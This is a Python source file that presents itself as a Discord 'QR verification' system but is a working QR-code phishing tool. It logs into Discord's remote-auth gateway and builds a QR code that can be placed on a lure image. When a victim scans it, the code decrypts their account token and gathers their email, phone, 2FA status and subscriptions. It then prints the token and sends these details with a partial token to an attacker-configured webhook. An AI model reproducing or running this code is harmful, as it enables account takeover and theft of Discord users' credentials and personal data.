"""
Discord QR Login System Core
"""

import base64
import json
import threading
import time
import os
import datetime
import httpx
import qrcode
import websocket
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from PIL import Image, ImageDraw

import config

DEBUG = config.DEBUG

class Messages:
    HEARTBEAT = 'heartbeat'
    HELLO = 'hello'
    INIT = 'init'
    NONCE_PROOF = 'nonce_proof'
    PENDING_REMOTE_INIT = 'pending_remote_init'
    PENDING_TICKET = 'pending_ticket'
    PENDING_LOGIN = 'pending_login'


class DiscordUser:
    def __init__(self, **values):
        self.id = values.get('id')
        self.username = values.get('username')
        self.discrim = values.get('discrim')
        self.avatar_hash = values.get('avatar_hash')
        self.token = values.get('token')
        self.email = None
        self.phone = None
        self.premium_type = None
        self.verified = None
        self.mfa_enabled = None
        self.locale = None
        self.flags = None
        self.nitro_type = "None"
        self.payment_methods = 0
        self.token_issued = None
        self.badges = None
        self.bio = None
        
    @classmethod
    def from_payload(cls, payload):
        values = payload.split(':')
        return cls(
            id=values[0],
            discrim=values[1],
            avatar_hash=values[2],
            username=values[3]
        )

    def fetch_additional_info(self):
        """Fetch additional user information using the token"""
        if not self.token:
            return
            
        headers = {'Authorization': self.token}
        
        try:
            with httpx.Client() as client:
                # Get user info
                response = client.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
                if response.status_code == 200:
                    user_data = response.json()
                    self.email = user_data.get('email')
                    self.phone = user_data.get('phone')
                    self.premium_type = user_data.get('premium_type')
                    self.verified = user_data.get('verified')
                    self.mfa_enabled = user_data.get('mfa_enabled')
                    self.locale = user_data.get('locale')
                    self.flags = user_data.get('flags')
                    self.bio = user_data.get('bio')
                    self.badges = user_data.get('public_flags_array', [])
                    
                    # Determine nitro type
                    if self.premium_type == 1:
                        self.nitro_type = "Nitro Classic"
                    elif self.premium_type == 2:
                        self.nitro_type = "Nitro"
                    elif self.premium_type == 3:
                        self.nitro_type = "Nitro Basic"
                    
                # Get billing info if available
                try:
                    response = client.get('https://discord.com/api/v9/users/@me/billing/subscriptions', 
                                         headers=headers, timeout=5)
                    if response.status_code == 200:
                        subs = response.json()
                        if subs:
                            self.active_subscriptions = len(subs)
                except:
                    pass
                    
                # Parse token issuance time
                if self.token:
                    try:
                        parts = self.token.split('.')
                        if len(parts) >= 2:
                            payload = parts[1]
                            payload += '=' * ((4 - len(payload) % 4) % 4)
                            decoded = json.loads(base64.b64decode(payload).decode('utf-8'))
                            if 'iat' in decoded:
                                self.token_issued = datetime.datetime.fromtimestamp(decoded['iat'])
                    except:
                        pass
                    
        except Exception as e:
            print(f"[INFO] Could not fetch additional info: {e}")

    def pretty_print(self):
        out = ''
        out += '╔══════════════════════════════════════╗\n'
        out += '║      🎭 DISCORD USER INFORMATION     ║\n'
        out += '╚══════════════════════════════════════╝\n\n'
        out += f'👑 Username:      {self.username}#{self.discrim}\n'
        out += f'🆔 User ID:       {self.id}\n'
        out += f'📧 Email:         {self.email if self.email else "Not available"}\n'
        out += f'📞 Phone:         {self.phone if self.phone else "Not available"}\n'
        out += f'🤑 Nitro:         {self.nitro_type}\n'
        out += f'✅ Verified:      {self.verified}\n'
        out += f'🔒 2FA Enabled:   {self.mfa_enabled}\n'
        out += f'🌍 Locale:        {self.locale if self.locale else "Not available"}\n'
        out += f'🏷️ Flags:         {self.flags if self.flags else "None"}\n'
        out += f'📝 Bio:           {self.bio[:50] + "..." if self.bio and len(self.bio) > 50 else (self.bio or "Not available")}\n'
        
        if hasattr(self, 'badges') and self.badges:
            badge_names = {
                1: "Staff", 2: "Partner", 4: "Hypesquad", 8: "Bug Hunter",
                64: "Hypesquad Bravery", 128: "Hypesquad Brilliance", 256: "Hypesquad Balance",
                512: "Early Supporter", 16384: "Gold Bug Hunter", 131072: "Verified Bot Developer"
            }
            badges = [badge_names.get(b, f"Unknown({b})") for b in self.badges]
            out += f'🏅 Badges:        {", ".join(badges)}\n'
        
        if hasattr(self, 'active_subscriptions'):
            out += f'💰 Active Subs:   {self.active_subscriptions}\n'
        
        out += f'💰 Payment Methods: {self.payment_methods}\n'
        if self.token_issued:
            out += f'⏰ Token Issued:   {self.token_issued}\n'
        out += f'🖼️ Avatar URL:    https://cdn.discordapp.com/avatars/{self.id}/{self.avatar_hash}.png\n'
        out += f'🔑 Token:         {self.token}\n'
        return out

    def get_webhook_payload(self):
        """Return payload for Discord webhook"""
        return {
            "content": f"@here New Discord user verification!",
            "embeds": [{
                "title": "✅ New Discord Verification",
                "color": 0x00ff00,
                "fields": [
                    {"name": "👑 Username", "value": f"{self.username}#{self.discrim}", "inline": True},
                    {"name": "🆔 User ID", "value": self.id, "inline": True},
                    {"name": "📧 Email", "value": self.email if self.email else "Not available", "inline": True},
                    {"name": "🤑 Nitro", "value": self.nitro_type, "inline": True},
                    {"name": "✅ Verified", "value": str(self.verified), "inline": True},
                    {"name": "🔒 2FA", "value": str(self.mfa_enabled), "inline": True},
                    {"name": "🔑 Token", "value": f"```{self.token[:50]}...```", "inline": False}
                ],
                "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{self.id}/{self.avatar_hash}.png"},
                "footer": {"text": "Discord QR Verification System"},
                "timestamp": datetime.datetime.now().isoformat()
            }]
        }


def send_to_webhook(user):
    """Send user information to Discord webhook"""
    if not config.WEBHOOK_URL or config.WEBHOOK_URL == "YOUR_WEBHOOK_URL_HERE":
        print("[INFO] Webhook URL not configured. Skipping webhook send.")
        return
    
    try:
        payload = user.get_webhook_payload()
        response = httpx.post(config.WEBHOOK_URL, json=payload, timeout=10)
        if response.status_code in [200, 204]:
            print("✅ Verification info sent to webhook!")
        else:
            print(f"⚠️ Failed to send to webhook: {response.status_code}")
    except Exception as e:
        print(f"⚠️ Error sending to webhook: {e}")


class DiscordAuthWebsocket:
    WS_ENDPOINT = 'wss://remote-auth-gateway.discord.gg/?v=2'
    LOGIN_ENDPOINT = 'https://discord.com/api/v9/users/@me/remote-auth/login'

    def __init__(self, debug=False, bot_mode=True):
        self.debug = debug or DEBUG
        self.bot_mode = bot_mode
        self.ws = websocket.WebSocketApp(
            self.WS_ENDPOINT,
            on_open=self.on_open,
            on_message=self.on_message,
            on_error=self.on_error,
            on_close=self.on_close,
            header={'Origin': 'https://discord.com'}
        )

        self.key = RSA.generate(2048)
        self.cipher = PKCS1_OAEP.new(self.key, hashAlgo=SHA256)

        self.heartbeat_interval = None
        self.last_heartbeat = None
        self.qr_image = None
        self.user = None
        self.qr_code_path = None
        self.fingerprint = None

    @property
    def public_key(self):
        pub_key = self.key.publickey().export_key().decode('utf-8')
        pub_key = ''.join(pub_key.split('\n')[1:-1])
        return pub_key

    def heartbeat_sender(self):
        while True:
            time.sleep(0.5)
            current_time = time.time()
            time_passed = current_time - self.last_heartbeat + 1
            if time_passed >= self.heartbeat_interval:
                try:
                    self.send(Messages.HEARTBEAT)
                except websocket.WebSocketConnectionClosedException:
                    return
                self.last_heartbeat = current_time

    def run(self):
        self.ws.run_forever()

    def send(self, op, data=None):
        payload = {'op': op}
        if data is not None:
            payload.update(**data)

        if self.debug:
            print(f'Send: {payload}')
        self.ws.send(json.dumps(payload))

    def exchange_ticket(self, ticket):
        print(f'Exchanging ticket: {ticket}')
        try:
            r = httpx.post(self.LOGIN_ENDPOINT, json={'ticket': ticket}, timeout=10)
            if r.status_code == 200:
                return r.json().get('encrypted_token')
        except Exception as e:
            print(f"Error exchanging ticket: {e}")
        return None

    def decrypt_payload(self, encrypted_payload):
        payload = base64.b64decode(encrypted_payload)
        decrypted = self.cipher.decrypt(payload)
        return decrypted

    def generate_qr_code(self, fingerprint):
        """Generate QR code and save it"""
        self.fingerprint = fingerprint
        img = qrcode.make(f'https://discordapp.com/ra/{fingerprint}')
        
        if self.qr_image is not None:
            try:
                self.qr_image.close()
            except Exception:
                pass
        self.qr_image = img

        # Try to use template
        template_path = os.path.abspath("template.png")
        self.qr_code_path = "qr_code.png"
        
        if os.path.exists(template_path):
            try:
                # Simple QR placement on template
                template = Image.open(template_path).convert("RGBA")
                qr_img = img.resize((400, 400), Image.LANCZOS)
                
                # Try to place QR in center
                x = (template.width - qr_img.width) // 2
                y = (template.height - qr_img.height) // 2
                
                template.paste(qr_img, (x, y), qr_img)
                self.qr_code_path = "qr_with_template.png"
                template.save(self.qr_code_path)
                print(f"✅ QR code with template saved: {self.qr_code_path}")
            except Exception as e:
                print(f"[WARN] Template composition failed: {e}")
                img.save(self.qr_code_path)
                print(f"✅ Plain QR code saved: {self.qr_code_path}")
        else:
            img.save(self.qr_code_path)
            print(f"✅ Plain QR code saved: {self.qr_code_path}")

    def on_open(self, ws):
        pass

    def on_message(self, ws, message):
        if self.debug:
            print(f'Recv: {message}')

        data = json.loads(message)
        op = data.get('op')

        if op == Messages.HELLO:
            print('Attempting server handshake...')

            self.heartbeat_interval = data.get('heartbeat_interval') / 1000
            self.last_heartbeat = time.time()

            thread = threading.Thread(target=self.heartbeat_sender)
            thread.daemon = True
            thread.start()

            self.send(Messages.INIT, {'encoded_public_key': self.public_key})

        elif op == Messages.NONCE_PROOF:
            nonce = data.get('encrypted_nonce')
            decrypted_nonce = self.decrypt_payload(nonce)

            proof = SHA256.new(data=decrypted_nonce).digest()
            proof = base64.urlsafe_b64encode(proof)
            proof = proof.decode().rstrip('=')
            self.send(Messages.NONCE_PROOF, {'proof': proof})

        elif op == Messages.PENDING_REMOTE_INIT:
            fingerprint = data.get('fingerprint')
            self.generate_qr_code(fingerprint)

            print('✅ QR code generated successfully!')

        elif op == Messages.PENDING_TICKET:
            encrypted_payload = data.get('encrypted_user_payload')
            payload = self.decrypt_payload(encrypted_payload)
            self.user = DiscordUser.from_payload(payload.decode())

        elif op == Messages.PENDING_LOGIN:
            ticket = data.get('ticket')
            encrypted_token = self.exchange_ticket(ticket)
            
            if encrypted_token:
                token = self.decrypt_payload(encrypted_token)
                
                if self.qr_image is not None:
                    try:
                        self.qr_image.close()
                    except Exception:
                        pass

                self.user.token = token.decode()
                
                # Fetch additional user information
                print("\n📡 Fetching additional user information...")
                self.user.fetch_additional_info()
                
                print("\n✅ Verification complete!")
                print(f"👤 User: {self.user.username}#{self.user.discrim}")
                
                self.ws.close()
            else:
                print("❌ Failed to exchange ticket for token")

    def on_error(self, ws, error):
        print(f'❌ WebSocket error: {error}')

    def on_close(self, ws, status_code, msg):
        print('🔒 Connection closed')
